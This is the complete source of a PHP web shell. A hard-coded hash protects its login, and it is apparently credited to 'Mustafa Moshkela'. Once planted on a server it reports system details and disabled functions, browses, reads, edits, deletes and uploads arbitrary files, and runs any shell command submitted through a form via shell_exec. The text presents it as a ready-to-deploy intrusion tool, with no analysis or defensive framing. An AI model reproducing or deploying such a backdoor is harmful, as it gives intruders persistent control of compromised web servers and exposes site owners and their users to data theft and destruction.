<?php
session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$auth_pass = "511aaabd0deae90b64dd5296bc7e082b"; // default: Motor Oil
if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 


function Login() {
	die("
<html>
<head>
<title>Login Page</title>
<style type='text/css'>
html {
    margin: 20px auto;
    background:black;
    color: green;
    text-align: center;
}
pre {
    color: white;
}

input[type=password] {
	background:transparent;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid white;
}

</style>
</head>
<center>
<br>
<br>
<header>
<br>
<pre align=center><form method='post'><input type='password' name='pass' style='background-color:none;border:1px solid #FFF;outline:none;' required><input type=submit value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>
");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml'>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css'>
<link href='http://fonts.googleapis.com/css?family=IM+Fell+English' rel='stylesheet' type='text/css'>
<link href='https://e.top4top.io/p_223755d240.jpg' rel='icon' />
<style>

@font-face {
  font-family: 'Averia Sans Libre';
  font-style: normal;
  font-weight: 400;
  src: local('Averia Sans Libre Regular'), local('AveriaSansLibre-Regular'), url(http://themes.googleusercontent.com/static/fonts/averiasanslibre/v1/yRJpjT39KxACO9F31mj_LqOxStDXxcWVrHkhVmjuyZ8.woff) format('woff');
}
@font-face {
  font-family: 'Orbitron';
  font-style: normal;
  font-weight: 700;
  src: local('Orbitron-Bold'), url(http://themes.googleusercontent.com/static/fonts/orbitron/v3/Y82YH_MJJWnsH2yUA5AuYYbN6UDyHWBl620a-IRfuBk.woff) format('woff');
}
html,body{
  height: 100%;
  margin: 0;
  padding: 0;
  font-family: 'Orbitron';
}
.ar{
  margin: 2px;
}
.c textarea{
  background: #F0FFFF;
  border:1px solid blue;
  color:#008000;
  position: fixed;
  left:370px;
  font-family: 'Orbitron';
}
.c input[type=submit]{
    position: fixed;
  left:620px;
  top:430px;
  font-family: 'Orbitron';
}
.c input[name=change_name]{
    position: absolute;
  top:0px;
  left: 840px;
  font-family: 'Orbitron';
}
.ar:hover{
  color:#00ff00;
}
.c{
  position: absolute;
  top:100px;
  margin: 20px;
  padding-left: 480px;
}
a>i:hover{
  color:#00ff00;
}
.info{
  margin-bottom: 50px;
  color:#F0FFFF;
  padding-bottom:  120px;
}
.info>img{
  position: absolute;
  left:10px;
  top:20px;
  opacity: 0.5;
  border-radius: 5px;
}
.info>.info1{
  position: absolute;
  left:170px;
  top:40px;
}
.info>.info2{
  position: absolute;
  right:100px;
  top:140px;
}
table{
  border-collapse: collapse;
  width: 100%;
  margin-right: auto;
  margin-left: auto;
}
.all{
  position: relative;
  min-height: 100%;
}
tr{
    transition: all 0.2s;
}
th{
  color:#F0FFFF;
  text-align: center;
  padding: 20px;
}
td{
  color:#F0FFFF;
  padding: 20px;
}
a{
  text-decoration: none;
  color:#F0FFFF;
}
a:hover{
  color:#02590f;
}
tr:hover{
  background: #CCC;
  opacity: 0.8;
}
.contr{
  text-align: center;
}
.chdir{
  position: absolute;
  left:20px;
  margin-top: 20px;
}
.mkdir{
  position: absolute;
  margin-top: 80px;
  left:20px;
}
input[type=text],input[type=file]{
  width: 400px;
  padding:10px;
  background:#F0FFFF;
  border:1px solid blue;
  color: 	#02590f000;
  text-shadow:0 0 5px;
  transition: all 0.4s;
  font-family: 'Orbitron';
}
input[type=submit]{
  padding:9px;
  background:#F0FFFF;
  border:1px solid blue;
  color: 	#02590f000;
  transition: all 0.3s;
  text-shadow:0 0 5px;
  font-family: 'Orbitron';
}
.exec{
  position: absolute;
  margin-top: 93px;
  left:20px;
}
.catfile{
  position: absolute;
  right:20px;
  margin-top: 20px;
}
.mkfile{
  position: absolute;
  right: 20px;
  margin-top: 30px;
}
.upload{
position: relative;
  top:130px;
  margin-left:751px;
}
input[type=submit]:hover{
  background: #02590f066;
  color:#F0FFFF;
  border:1px solid #02590f;
  cursor: pointer;
}
.footer{
  margin-bottom:-250px;
  position: absolute;
  width: 100%;
  text-align: center;
  color:#F0FFFF;
  background: #111;
  opacity: 0.7;
  bottom: 0;
  border-top: 2px solid #F0FFFF;
}
input[type=text]:focus{
  width: 450px;
}
.fa{
  margin-right: 20px;
}

</style>
</head>
<body>
<img src='https://images4.alphacoders.com/291/291278.jpg' title='Coded By Mustafa Moshkela' style='position:fixed;width:100%;heigth:100%;top:0;left:0;z-index:-9999;' disabled>
<div class=all>
<div class=head></div>
<div class=main>
<?
$safe = ini_get("safe_mode");
if($safe == 1){
	$safe_mode =  "<font color=red>ON</font>";
	}else{
		$safe_mode = "<font color=green>OFF</font>";
		}
$dis = ini_get("disable_functions");
if($dis == ""){
	$disable = "<font color=green>None</font>";
	}else{
		$disable = "<font color=red>$dis</font>";
		}
$uname = php_uname();
$server = $_SERVER['SERVER_ADDR'];
$me = $_SERVER['REMOTE_ADDR'];
echo "
<div class=info>
<span class=info1>
Uname-a : $uname<br>
Safe Mode : $safe_mode<br>
Disable Functions : $disable
</span>
<span class=info2>
Server IP : $server <br>
Your IP : $me <br>
</span>
</div>
";
 $d=isset($dir) ? $dir : getcwd(); 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);} 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
$d = str_replace("\\\\","\\",$d); 
$dispd = htmlspecialchars($d); 
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,strlen($d)-1)); 
$i = 0; 
foreach($pd as $b) 
{ 
 $t = ""; 
 reset($e); 
 $j = 0; 
 foreach ($e as $r) 
 { 
  $t.= $r.DIRECTORY_SEPARATOR; 
  if ($j == $i) {break;} 
  $j++; 
 } 
 echo "<a class=ar href='?dir=$t'><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>"; 
 $i++; 
} 
echo "<a href=?dir=".realpath('..')."><i class=\"fa fa-arrow-circle-left\"></i></a><hr>";
$dir = $_GET['dir'];
function rm_dir($dir){
  if(isset($dir)){
$new = chdir($dir);
$real = realpath($dir);
$all = opendir($real);
while($entry = readdir($all)){
  unlink($entry);
  rmdir($dir);
}
}
}
$pwd = realpath(".");
$all = opendir(".");
echo "<table border=1>
<tr>
<th>Files</th>
<th>Type</th>
<th>Size</th>
<th>Perms</th>
<th>Action</th>
</tr>
";
$dir = '.';
$directories = array();
$files_list  = array();
$files = scandir($dir);
foreach($files as $file){
   if(($file != '.') && ($file != '..')){
      if(is_dir($dir.'/'.$file)){
         $directories[]  = $file;

      }else{
         $files_list[]    = $file;

      }
   }
}
echo "<tr><td><a href=?dir=".realpath('..')."><i class=\"fa fa-arrow-circle-left\"></i></a></td>
<td>Back</td>
<td>Back</td>
<td>Back</td>
</tr>";
foreach($directories as $directory){
   echo "<tr>
   <td><i class=\"fa fa-folder-o\"></i>  <a href='?dir=".realpath($directory)."'>$directory</a></td>
   <td>[DIR]</td>
   <td>".filesize($directory)."</td>
   <td>".fileperms($directory)."</td>
   <td><a href='?to=".realpath($directory)."&action=ren'><i class=\"fa fa-cog\"></i> Rename</a> - <a href='?dir=".realpath($directory)."&action=del'><i class=\"fa fa-times\"></i> Del</a></td>
   </tr>";
}
foreach($files_list as $file_list){
   echo "<tr>
   <td><i class=\"fa fa-file\"></i>  <a href='?file=".realpath($file_list)."'>$file_list</a></td>
   <td>[File]</td>
<td>".filesize($file_list)."</td>
<td>".fileperms($file_list)."</td>
<td><a href='?FILE=".realpath($file_list)."&action=file_ed'><i class=\"fa fa-edit\"></i> Edit</a> - <a href='?FILE=".realpath($file_list)."&action=file_ren'><i class=\"fa fa-cog\"></i> Rename</a> - <a href='?FILE=".realpath($file_list)."&action=file_rm'><i class=\"fa fa-times\"></i> Del</a></td>
   </tr>";
}
echo "</table>";
echo "
<div class=contr>
<div class=chdir>
<form method=get>
<input type=text name=dir value=$pwd>
<input type=submit name=go_ch value='>>'>
</form>
</div>
<div class=mkdir>
<form method=post>
<input type=text name=mkdir value='Make New Dir'>
<input type=submit name=go_mkdir value='>>'>
</form>
</div>
<div class=catfile>
<form method=post>
<input type=text name=cat value='File 2 Cat'>
<input type=submit name=go_cat value='>>'>
</form>
</div>
<div class=upload>
<form method=post enctype='multipart/form-data'>
<input type=file name=file>
<input type=submit name=go_file value='>>'>
</form>
</div>
<div class=exec>
<form method=post>
<input type=text name=cmd value='C M D'>
<input type=submit name=go_cmd value='>>'>
</form>
</div>
<div class=mkfile>
<form method=post>
<input type=text name=mkfile value='Make New File'>
<input type=submit name=go_mkfile value='>>'>
</form>
</div>
</div>";
echo "
</div>
</body>
</html>
";
if($_REQUEST['action'] == "file_ed"){
	$nF = $_GET['FILE'];
	$all_f = htmlspecialchars(file_get_contents($nF));
			echo "<div class=c>
		<form method=post>
		<input type=hidden value=".$nF.">
		<textarea style='width:550px;height:300px;' name=ffile>$all_f</textarea><br>
		<input type=submit name=edit_file value='>>'>
		</form>
		</div>";
		if($_POST['edit_file']){
			$con= str_replace("\\","",$_POST['ffile']);
			file_put_contents($nF,$con);
			echo "<meta http-equiv=\"refresh\" content=\"0;URL='?'\" />";
			}
	}
	if(isset($_GET['file'])){
	$get = htmlspecialchars(file_get_contents($_GET['file']));
	echo "<div class=c>
		<form method=post>
		<textarea style='width:550px;height:300px;' name=ffile disabled>$get</textarea><br>
		</form>
		</div>";
	}
if($_REQUEST['action'] == "file_rm"){
	$nF = $_GET['FILE'];
	unlink($nF);
	echo "<meta http-equiv=\"refresh\" content=\"0;URL='?'\" />";
	}
if($_REQUEST['action'] == "file_ren"){
	$newF = $_GET['FILE'];
			echo "
		<div class=c>
		<form method=post>
		<input style='width:150px;' type=text name=old value='".$newF."'>
		<input style='width:150px;' type=text name=new value=New>
		<input type=submit name=change_name value='>>'>
		</form>
		</div>
		";
		if($_POST['change_name']){
			rename($_POST['old'],$_POST['new']);
			echo "<meta http-equiv=\"refresh\" content=\"0;URL='?'\" />";
			}
	}
if($_REQUEST['action'] == "del"){
	$newD = $_GET['dir'];
rm_dir($newD);
echo "<meta http-equiv=\"refresh\" content=\"0;URL='?'\" />";
	}
	if($_REQUEST['action'] == "ren"){
		$dd = $_GET['to'];
		echo "
		<div class=c>
		<form method=post>
		<input style='width:150px;' type=text name=old value='".$dd."'>
		<input style='width:150px;' type=text name=new value=New>
		<input type=submit name=change_name value='>>'>
		</form>
		</div>
		";
		if($_POST['change_name']){
			rename($_POST['old'],$_POST['new']);
			echo "<meta http-equiv=\"refresh\" content=\"0;URL='?'\" />";
			}
	}
	if($_POST['go_cat']){
		$gn = file_get_contents($_POST['cat']);
			echo "<div class=c>
		<form method=post>
		<textarea style='width:550px;height:300px;' name=ffile>".$gn."</textarea><br>
		</form>
		</div>";
		}
		if($_POST['go_mkdir']){
			mkdir($_POST['mkdir']);
			echo "<meta http-equiv=\"refresh\" content=\"0;URL='#'\" />";
			}
			if($_POST['go_cmd']){
				$gsn = shell_exec($_POST['cmd']);
							echo "<div class=c>
		<form method=post>
		<textarea style='width:550px;height:300px;' name=ffile>".$gsn."</textarea><br>
		</form>
		</div>";
			}
			if($_GET['go_ch']){
				chdir($_GET['ch']);
				}
				if($_POST['go_file']){
					$name = $_FILES['file']['name'];
					$tmp = $_FILES['file']['tmp_name'];
					copy($tmp,realpath('.').'/'.$name);
					echo "<meta http-equiv=\"refresh\" content=\"0;URL='#'\" />";
					}
					if($_POST['go_mkfile']){
						$hand = fopen($_POST['mkfile'],"w");
						fwrite($hand,"");
						$good = realpath($_POST['mkfile']);
						echo "<meta http-equiv=\"refresh\" content=\"0;URL='?FILE=".$good."&action=file_ed'\" />";
						}
?>